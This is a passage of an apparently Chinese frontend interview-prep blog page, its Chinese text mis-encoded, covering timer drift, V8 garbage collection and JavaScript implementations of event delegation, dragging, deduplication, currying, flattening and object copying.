ä¸ªæ•°æ®ï¼Œè¿™ä¸ªè¯¥æ€ä¹ˆåŠï¼Ÿ</h2><p>æˆ‘ä»¬éœ€è¦æ€è€ƒçš„é—®é¢˜ï¼šè¯¥å¤„ç†æ˜¯å¦å¿…é¡»åŒæ­¥å®Œæˆï¼Ÿæ•°æ®æ˜¯å¦å¿…é¡»æŒ‰é¡ºåºå®Œæˆï¼Ÿ</p><p>è§£å†³åŠæ³•ï¼š</p><p>ï¼ˆ1ï¼‰å°†æ•°æ®<strong>åˆ†é¡µ</strong>ï¼Œåˆ©ç”¨åˆ†é¡µçš„åŸç†ï¼Œæ¯æ¬¡æœåŠ¡å™¨ç«¯åªè¿”å›ä¸€å®šæ•°ç›®çš„æ•°æ®ï¼Œæµè§ˆå™¨æ¯æ¬¡åªå¯¹ä¸€éƒ¨åˆ†è¿›è¡ŒåŠ è½½ã€‚</p><p>ï¼ˆ2ï¼‰ä½¿ç”¨<strong>æ‡’åŠ è½½</strong>çš„æ–¹æ³•ï¼Œæ¯æ¬¡åŠ è½½ä¸€éƒ¨åˆ†æ•°æ®ï¼Œå…¶ä½™æ•°æ®å½“éœ€è¦ä½¿ç”¨æ—¶å†å»åŠ è½½ã€‚</p><p>ï¼ˆ3ï¼‰ä½¿ç”¨<strong>æ•°ç»„åˆ†å—æŠ€æœ¯</strong>ï¼ŒåŸºæœ¬æ€è·¯æ˜¯ä¸ºè¦å¤„ç†çš„é¡¹ç›®åˆ›å»ºä¸€ä¸ªé˜Ÿåˆ—ï¼Œç„¶åè®¾ç½®å®šæ—¶å™¨æ¯è¿‡ä¸€æ®µæ—¶é—´å–å‡ºä¸€éƒ¨åˆ†æ•°æ®ï¼Œç„¶åå†ä½¿ç”¨å®šæ—¶å™¨å–å‡ºä¸‹ä¸€ä¸ªè¦å¤„ç†çš„é¡¹ç›®è¿›è¡Œå¤„ç†ï¼Œæ¥ç€å†è®¾ç½®å¦ä¸€ä¸ªå®šæ—¶å™¨ã€‚</p><h2 id="js-ä¸­å€’è®¡æ—¶çš„çº åå®ç°ï¼Ÿ"><a href="#js-ä¸­å€’è®¡æ—¶çš„çº åå®ç°ï¼Ÿ" class="headerlink" title="*js ä¸­å€’è®¡æ—¶çš„çº åå®ç°ï¼Ÿ"></a>*js ä¸­å€’è®¡æ—¶çš„çº åå®ç°ï¼Ÿ</h2><p>åœ¨å‰ç«¯å®ç°ä¸­æˆ‘ä»¬ä¸€èˆ¬é€šè¿‡ setTimeout å’Œ setInterval æ–¹æ³•æ¥å®ç°ä¸€ä¸ªå€’è®¡æ—¶æ•ˆæœã€‚ä½†æ˜¯ä½¿ç”¨è¿™äº›æ–¹æ³•ä¼šå­˜åœ¨æ—¶é—´åå·®çš„é—®é¢˜ï¼Œè¿™æ˜¯ç”±äº js çš„ç¨‹åºæ‰§è¡Œæœºåˆ¶é€ æˆçš„ï¼ŒsetTimeout å’Œ setInterval çš„ä½œç”¨æ˜¯éš”ä¸€æ®µæ—¶é—´å°†å›è°ƒäº‹ä»¶åŠ å…¥åˆ°äº‹ä»¶é˜Ÿåˆ—ä¸­ï¼Œå› æ­¤äº‹ä»¶å¹¶ä¸æ˜¯ç«‹å³æ‰§è¡Œçš„ï¼Œå®ƒä¼š<strong>ç­‰åˆ°å½“å‰æ‰§è¡Œæ ˆä¸ºç©ºçš„æ—¶å€™å†å–å‡ºäº‹ä»¶æ‰§è¡Œ</strong>ï¼Œå› æ­¤äº‹ä»¶ç­‰å¾…æ‰§è¡Œçš„æ—¶é—´å°±æ˜¯é€ æˆè¯¯å·®çš„åŸå› ã€‚</p><p>ä¸€èˆ¬è§£å†³å€’è®¡æ—¶ä¸­çš„è¯¯å·®çš„æœ‰è¿™æ ·ä¸¤ç§åŠæ³•ï¼š</p><p>ï¼ˆ1ï¼‰ç¬¬ä¸€ç§æ˜¯é€šè¿‡å‰ç«¯å®šæ—¶å‘æœåŠ¡å™¨å‘é€è¯·æ±‚è·å–æœ€æ–°çš„æ—¶é—´å·®ï¼Œä»¥æ­¤æ¥æ ¡å‡†å€’è®¡æ—¶æ—¶é—´ã€‚</p><p>ï¼ˆ2ï¼‰ç¬¬äºŒç§æ–¹æ³•æ˜¯å‰ç«¯æ ¹æ®åå·®æ—¶é—´æ¥è‡ªåŠ¨è°ƒæ•´é—´éš”æ—¶é—´çš„æ–¹å¼æ¥å®ç°çš„ã€‚è¿™ä¸€ç§æ–¹å¼é¦–å…ˆæ˜¯ä»¥ setTimeout é€’å½’çš„æ–¹å¼æ¥å®ç°å€’è®¡æ—¶ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªå˜é‡æ¥è®°å½•å·²ç»å€’è®¡æ—¶çš„ç§’æ•°ã€‚æ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œé¦–å…ˆå°†å˜é‡åŠ ä¸€ï¼Œç„¶åæ ¹æ®è¿™ä¸ªå˜é‡å’Œæ¯æ¬¡çš„é—´éš”æ—¶é—´ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºæ­¤æ—¶æ— åå·®æ—¶åº”è¯¥æ˜¾ç¤ºçš„æ—¶é—´ã€‚ç„¶åå°†å½“å‰çš„çœŸå®æ—¶é—´ä¸è¿™ä¸ªæ—¶é—´ç›¸å‡ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°æ—¶é—´çš„åå·®å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨è®¾ç½®ä¸‹ä¸€ä¸ªå®šæ—¶å™¨çš„é—´éš”å¤§å°çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±ä»é—´éš”æ—¶é—´ä¸­å‡å»è¿™ä¸ªåå·®å¤§å°ï¼Œä»¥æ­¤æ¥å®ç°ç”±äºç¨‹åºæ‰§è¡Œæ‰€é€ æˆçš„æ—¶é—´è¯¯å·®çš„çº æ­£ã€‚</p><h2 id="V8-ä¸‹çš„åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ"><a href="#V8-ä¸‹çš„åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ" class="headerlink" title="V8 ä¸‹çš„åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ"></a>V8 ä¸‹çš„åƒåœ¾å›æ”¶æœºåˆ¶æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ</h2><p>V8 å®ç°äº†å‡†ç¡®å¼ GCï¼ŒGC ç®—æ³•é‡‡ç”¨äº†åˆ†ä»£å¼åƒåœ¾å›æ”¶æœºåˆ¶ã€‚å› æ­¤ï¼ŒV8 å°†å†…å­˜ï¼ˆå †ï¼‰åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€ç”Ÿä»£ä¸¤éƒ¨åˆ†ã€‚</p><h3 id="æ–°ç”Ÿä»£ç®—æ³•"><a href="#æ–°ç”Ÿä»£ç®—æ³•" class="headerlink" title="æ–°ç”Ÿä»£ç®—æ³•"></a>æ–°ç”Ÿä»£ç®—æ³•</h3><p>æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ä¸€èˆ¬å­˜æ´»æ—¶é—´è¾ƒçŸ­ï¼Œä½¿ç”¨ Scavenge GC ç®—æ³•ã€‚</p><p>åœ¨æ–°ç”Ÿä»£ç©ºé—´ä¸­ï¼Œå†…å­˜ç©ºé—´åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œåˆ†åˆ«ä¸º From ç©ºé—´å’Œ To ç©ºé—´ã€‚åœ¨è¿™ä¸¤ä¸ªç©ºé—´ä¸­ï¼Œå¿…å®šæœ‰ä¸€ä¸ªç©ºé—´æ˜¯ä½¿ç”¨çš„ï¼Œå¦ä¸€ä¸ªç©ºé—´æ˜¯ç©ºé—²çš„ã€‚æ–°åˆ†é…çš„å¯¹è±¡ä¼šè¢«æ”¾å…¥ From ç©ºé—´ä¸­ï¼Œå½“ From ç©ºé—´è¢«å æ»¡æ—¶ï¼Œæ–°ç”Ÿä»£ GC å°±ä¼šå¯åŠ¨äº†ã€‚ç®—æ³•ä¼šæ£€æŸ¥ From ç©ºé—´ä¸­å­˜æ´»çš„å¯¹è±¡å¹¶å¤åˆ¶åˆ° To ç©ºé—´ä¸­ï¼Œå¦‚æœæœ‰å¤±æ´»çš„å¯¹è±¡å°±ä¼šé”€æ¯ã€‚å½“å¤åˆ¶å®Œæˆåå°† From ç©ºé—´å’Œ To ç©ºé—´äº’æ¢ï¼Œè¿™æ · GC å°±ç»“æŸäº†ã€‚</p><h3 id="è€ç”Ÿä»£ç®—æ³•"><a href="#è€ç”Ÿä»£ç®—æ³•" class="headerlink" title="è€ç”Ÿä»£ç®—æ³•"></a>è€ç”Ÿä»£ç®—æ³•</h3><p>ä»€ä¹ˆæƒ…å†µä¸‹å¯¹è±¡ä¼šå‡ºç°åœ¨è€ç”Ÿä»£ç©ºé—´ä¸­ï¼š</p><ul><li>æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡æ˜¯å¦å·²ç»ç»å†è¿‡ä¸€æ¬¡ Scavenge ç®—æ³•ï¼Œå¦‚æœç»å†è¿‡çš„è¯ï¼Œä¼šå°†å¯¹è±¡ä»æ–°ç”Ÿä»£ç©ºé—´ç§»åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ã€‚</li><li>To ç©ºé—´çš„å¯¹è±¡å æ¯”å¤§å°è¶…è¿‡ 25 %ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸ºäº†ä¸å½±å“åˆ°å†…å­˜åˆ†é…ï¼Œä¼šå°†å¯¹è±¡ä»æ–°ç”Ÿä»£ç©ºé—´ç§»åˆ°è€ç”Ÿä»£ç©ºé—´ä¸­ã€‚</li></ul><p>è€ç”Ÿä»£ä¸­çš„å¯¹è±¡ä¸€èˆ¬å­˜æ´»æ—¶é—´è¾ƒé•¿ä¸”æ•°é‡ä¹Ÿå¤šï¼Œä½¿ç”¨äº†ä¸¤ä¸ªç®—æ³•ï¼Œåˆ†åˆ«æ˜¯<strong>æ ‡è®°æ¸…é™¤ç®—æ³•</strong>å’Œ<strong>æ ‡è®°å‹ç¼©ç®—æ³•</strong>ã€‚åœ¨è€ç”Ÿä»£ä¸­ï¼Œä»¥ä¸‹æƒ…å†µä¼šå…ˆå¯åŠ¨æ ‡è®°æ¸…é™¤ç®—æ³•ï¼š</p><ul><li>æŸä¸€ä¸ªç©ºé—´æ²¡æœ‰åˆ†å—çš„æ—¶å€™</li><li>ç©ºé—´ä¸­è¢«å¯¹è±¡è¶…è¿‡ä¸€å®šé™åˆ¶</li><li>ç©ºé—´ä¸èƒ½ä¿è¯æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡ç§»åŠ¨åˆ°è€ç”Ÿä»£ä¸­</li></ul><h1 id="JavaScript-å®ç°"><a href="#JavaScript-å®ç°" class="headerlink" title="JavaScript å®ç°"></a>JavaScript å®ç°</h1><h2 id="å®ç°ä¸€ä¸ªäº‹ä»¶å§”æ‰˜"><a href="#å®ç°ä¸€ä¸ªäº‹ä»¶å§”æ‰˜" class="headerlink" title="å®ç°ä¸€ä¸ªäº‹ä»¶å§”æ‰˜"></a>å®ç°ä¸€ä¸ªäº‹ä»¶å§”æ‰˜</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ul&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l2&quot;</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l3&quot;</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;l4&quot;</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç»™liç»‘å®šäº‹ä»¶ï¼Œæ³¨æ„ä»¥ä¸Šè¿™ç§æƒ…å†µã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">element, eventType, selector, fn</span>) </span>&#123;</span><br><span class="line">  element.addEventListener(eventType, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> el = e.target</span><br><span class="line">      <span class="comment">// å¦‚æœå…ƒç´ è¢«æŒ‡å®šçš„é€‰æ‹©å™¨å­—ç¬¦ä¸²é€‰æ‹©ï¼ŒElement.matches()æ–¹æ³•è¿”å›true</span></span><br><span class="line">      <span class="keyword">while</span> (!el.matches(selector)) &#123;</span><br><span class="line">          <span class="comment">// éå†åˆ°æœ€é¡¶å±‚ï¼Œé€€å‡º</span></span><br><span class="line">          <span class="keyword">if</span> (element === el) &#123;</span><br><span class="line">              el = <span class="literal">null</span></span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">          &#125;</span><br><span class="line">          el = el.parentNode</span><br><span class="line">      &#125;</span><br><span class="line">      el &amp;&amp; <span class="built_in">console</span>.log(<span class="string">&#x27;æ‰§è¡Œå›è°ƒå‡½æ•°&#x27;</span>)</span><br><span class="line">  &#125;,<span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">return</span> element</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°ä¸€ä¸ªå¯ä»¥æ‹–æ‹½çš„DIV"><a href="#å®ç°ä¸€ä¸ªå¯ä»¥æ‹–æ‹½çš„DIV" class="headerlink" title="å®ç°ä¸€ä¸ªå¯ä»¥æ‹–æ‹½çš„DIV"></a>å®ç°ä¸€ä¸ªå¯ä»¥æ‹–æ‹½çš„DIV</h2><p>ä¸€ä¸ªå…ƒç´ çš„æ‹–æ‹½è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼Œç¬¬ä¸€æ­¥æ˜¯é¼ æ ‡æŒ‰ä¸‹ç›®æ ‡å…ƒç´ ï¼Œç¬¬äºŒæ­¥æ˜¯é¼ æ ‡ä¿æŒæŒ‰ä¸‹çš„çŠ¶æ€ç§»åŠ¨é¼ æ ‡ï¼Œç¬¬ä¸‰æ­¥æ˜¯é¼ æ ‡æŠ¬èµ·ï¼Œæ‹–æ‹½è¿‡ç¨‹ç»“æŸã€‚ä¸‰ä¸ªé¼ æ ‡äº‹ä»¶ï¼šç‚¹å‡»ã€ç§»åŠ¨ã€æŠ¬èµ·ã€‚</p><p>å¦‚æœæ˜¯å›¾ç‰‡ï¼ŒåŠ å…¥<code>e.preventDefault();</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dv=<span class="built_in">document</span>.getElementById(<span class="string">&#x27;dv&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> isDrag=<span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> position=<span class="literal">null</span></span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mousedown&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    isDrag=<span class="literal">true</span></span><br><span class="line">    position=[e.clientX,e.clientY]</span><br><span class="line">&#125;)</span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mousemove&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!isDrag) <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">    <span class="keyword">const</span> x=e.clientX</span><br><span class="line">    <span class="keyword">const</span> y=e.clientY</span><br><span class="line">    <span class="keyword">const</span> changeX=x-position[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">const</span> changeY=y-position[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">const</span> left=<span class="built_in">parseInt</span>(dv.style.left||<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">const</span> top=<span class="built_in">parseInt</span>(dv.style.top||<span class="number">0</span>)</span><br><span class="line">    dv.style.left=left+changeX+<span class="string">&#x27;px&#x27;</span></span><br><span class="line">    dv.style.top=top+changeY+<span class="string">&#x27;px&#x27;</span></span><br><span class="line">    position=[x,y]</span><br><span class="line">&#125;)</span><br><span class="line">dv.addEventListener(<span class="string">&#x27;mouseup&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    isDrag=<span class="literal">false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="å®ç°æ•°ç»„å»é‡ï¼Ÿ"><a href="#å®ç°æ•°ç»„å»é‡ï¼Ÿ" class="headerlink" title="å®ç°æ•°ç»„å»é‡ï¼Ÿ"></a>å®ç°æ•°ç»„å»é‡ï¼Ÿ</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>,  <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;1&#x27;</span>), <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&#x27;1&#x27;</span>), <span class="regexp">/a/</span>, <span class="regexp">/a/</span>, <span class="literal">NaN</span>, <span class="literal">NaN</span>];</span><br></pre></td></tr></table></figure><ol><li><p>Set</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> unique_1 = <span class="function"><span class="params">arr</span> =&gt;</span> [...new <span class="built_in">Set</span>(arr)]</span><br><span class="line"><span class="comment">// ä¾‹å­:</span></span><br><span class="line"><span class="keyword">let</span> fn = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> Arr_new = [].concat.apply([],<span class="built_in">arguments</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(Arr_new))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> demo1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], demo2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>], demo3 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(fn(demo1,demo2,demo3))<span class="comment">// [1,2,3,4,5,6]</span></span><br></pre></td></tr></table></figure></li><li><p>filter</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_2</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> res = array.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array.indexOf(item) === index;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>reduce</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> unique_3 = <span class="function"><span class="params">arr</span> =&gt;</span> arr.reduce(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> pre.includes(cur) ? pre : [...pre, cur],[]);</span><br></pre></td></tr></table></figure></li><li><p>åŒé‡forå¾ªç¯</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_4</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; array.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; array.length; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (array[i] === array[j]) &#123;</span><br><span class="line">        array.splice(j, <span class="number">1</span>);</span><br><span class="line">        j--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Object é”®å€¼å¯¹(æ•ˆæœæœ€å¥½)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unique_5</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> array.filter(<span class="function"><span class="keyword">function</span> (<span class="params">item, index, array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj.hasOwnProperty(<span class="keyword">typeof</span> item + item) ? <span class="literal">false</span> : (obj[<span class="keyword">typeof</span> item + item] = <span class="literal">true</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="å®ç°å‡½æ•°æŸ¯é‡ŒåŒ–"><a href="#å®ç°å‡½æ•°æŸ¯é‡ŒåŒ–" class="headerlink" title="å®ç°å‡½æ•°æŸ¯é‡ŒåŒ–"></a>å®ç°å‡½æ•°æŸ¯é‡ŒåŒ–</h2><p>æŸ¯é‡ŒåŒ–å°±æ˜¯æŠŠæ¥å—<strong>ã€Œå¤šä¸ªå‚æ•°ã€</strong>çš„å‡½æ•°å˜æ¢æˆæ¥å—ä¸€ä¸ª<strong>ã€Œå•ä¸€å‚æ•°ã€</strong>çš„å‡½æ•°ï¼Œå¹¶ä¸”è¿”å›æ¥å—<strong>ã€Œä½™ä¸‹å‚æ•°ã€</strong>è¿”å›ç»“æœçš„ä¸€ç§åº”ç”¨ã€‚å…·ä½“å®ç°å‚è€ƒè‡ª<a href="https://zh.javascript.info/currying-partials">è¯¥æ–‡ç« </a>ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params">func</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">curried</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ¤æ–­å‚æ•°çš„é•¿åº¦æ˜¯å¦æ»¡è¶³å‡½æ•°æ‰€éœ€å‚æ•°çš„é•¿åº¦</span></span><br><span class="line">    <span class="keyword">if</span> (args.length &gt;= func.length) &#123;</span><br><span class="line">      <span class="comment">// æ»¡è¶³åˆ™æ‰§è¡Œå‡½æ•°</span></span><br><span class="line">      <span class="keyword">return</span> func.apply(<span class="built_in">this</span>, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// å¦åˆ™é€’å½’è¿”å›æŸ¯é‡ŒåŒ–çš„å‡½æ•°ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">      <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args2</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> curried.apply(<span class="built_in">this</span>, args.concat(args2));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">let</span> currying = <span class="function">(<span class="params">fn, ...args</span>) =&gt;</span></span><br><span class="line">            fn.length &gt; args.length ?</span><br><span class="line">            <span class="function">(<span class="params">...<span class="built_in">arguments</span></span>) =&gt;</span> currying(fn, ...args, ...arguments) :</span><br><span class="line">            fn(...args)</span><br></pre></td></tr></table></figure><h2 id="å®ç°æ•°ç»„æ‰å¹³åŒ–"><a href="#å®ç°æ•°ç»„æ‰å¹³åŒ–" class="headerlink" title="å®ç°æ•°ç»„æ‰å¹³åŒ–"></a>å®ç°æ•°ç»„æ‰å¹³åŒ–</h2><p>ä½¿ç”¨ reduceã€concat å’Œé€’å½’å±•å¼€æ— é™å¤šå±‚åµŒå¥—çš„æ•°ç»„ï¼Œè¯¦æƒ…è§<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/flat#reduce_concat_isarray_recursivity">MDN reduceåº”ç”¨</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flat</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.flat(num)</span><br><span class="line"><span class="comment">//æ­£ç»å†™æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flatDeep</span>(<span class="params">arr, d = <span class="number">1</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> d &gt; <span class="number">0</span> ? arr.reduce(<span class="function">(<span class="params">acc, val</span>) =&gt;</span> acc.concat(<span class="built_in">Array</span>.isArray(val) ? flatDeep(val, d - <span class="number">1</span>) : val), []) : arr.slice();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®ç°æ‹·è´"><a href="#å®ç°æ‹·è´" class="headerlink" title="å®ç°æ‹·è´"></a>å®ç°æ‹·è´</h2><h3 id="æµ…æ‹·è´"><a href="#æµ…æ‹·è´" class="headerlink" title="æµ…æ‹·è´"></a>æµ…æ‹·è´</h3><p>1ã€Object.assign()å®ç°</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> initalObj = <span class="built_in">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure><p>2ã€å‡½æ•°åº“lodashçš„_.cloneæ–¹æ³•</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj2 = _.clone(obj1);</span><br></pre></td></tr></table></figure><p>3ã€å±•å¼€è¿ç®—ç¬¦â€¦</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj2= &#123;...obj1&#125;</span><br></pre></td></tr></table></figure><p>4ã€Array.prototype.concat()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr2 = arr.concat();    </span><br></pre></td></tr></table></figure><p>5ã€Array.prototype.slice()</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr3 = arr.slice();</span><br></pre></td></tr></table></figure><h3 id="æ·±æ‹·è´"><a href="#æ·±æ‹·è´" class="headerlink" title="æ·±æ‹·è´"></a>æ·±æ‹·è´</h3><p>1ã€å‚è€ƒè‡ª<a href="https://segmentfault.com/a/1190000020255831">å¦‚ä½•å†™å‡ºä¸€ä¸ªæƒŠè‰³é¢è¯•å®˜çš„æ·±æ‹·è´?</a>ï¼Œè®²çš„çœŸçš„å¾ˆè¯¦ç»†ï¼ä½†æ˜¯å‰©ä¸‹çš„å¾ˆå¤šå¥½æ²¡æœ‰å®ç°ã€‚</p><ul><li>åŸºæœ¬å®ç°<ul><li><input checked="" disabled="" type="checkbox"> é€’å½’èƒ½åŠ›</li></ul></li><li>å¾ªç¯å¼•ç”¨<ul><li><input checked="" disabled="" type="checkbox"> è€ƒè™‘é—®é¢˜çš„å…¨é¢æ€§</li><li><input checked="" disabled="" type="checkbox"> ç†è§£weakmapçš„çœŸæ­£æ„ä¹‰</li></ul></li><li>å¤šç§ç±»å‹<ul><li><input disabled="" type="checkbox"> è€ƒè™‘é—®é¢˜çš„ä¸¥è°¨æ€§</li><li><input disabled="" type="checkbox"> åˆ›å»ºå„ç§å¼•ç”¨ç±»å‹çš„æ–¹æ³•ï¼ŒJS APIçš„ç†Ÿç»ƒç¨‹åº¦</li><li><input disabled="" type="checkbox"> å‡†ç¡®çš„åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œå¯¹æ•°æ®ç±»å‹çš„ç†è§£ç¨‹åº¦</li></ul></li><li>é€šç”¨éå†ï¼š<ul><li><input disabled="" type="checkbox"> å†™ä»£ç å¯ä»¥è€ƒè™‘æ€§èƒ½ä¼˜åŒ–</li><li><input disabled="" type="checkbox"> äº†è§£é›†ä¸­éå†çš„æ•ˆç‡</li><li><input disabled="" type="checkbox"> ä»£ç æŠ½è±¡èƒ½åŠ›</li></ul></li><li>æ‹·è´å‡½æ•°ï¼š<ul><li><input disabled="" type="checkbox"> ç®­å¤´å‡½æ•°å’Œæ™®é€šå‡½æ•°çš„åŒºåˆ«</li><li><input disabled="" type="checkbox"> æ­£åˆ™è¡¨è¾¾å¼ç†Ÿç»ƒç¨‹åº¦</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">target, map = <span class="keyword">new</span> <span class="built_in">WeakMap</span>()</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (target <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>) <span class="keyword">return</span> <span 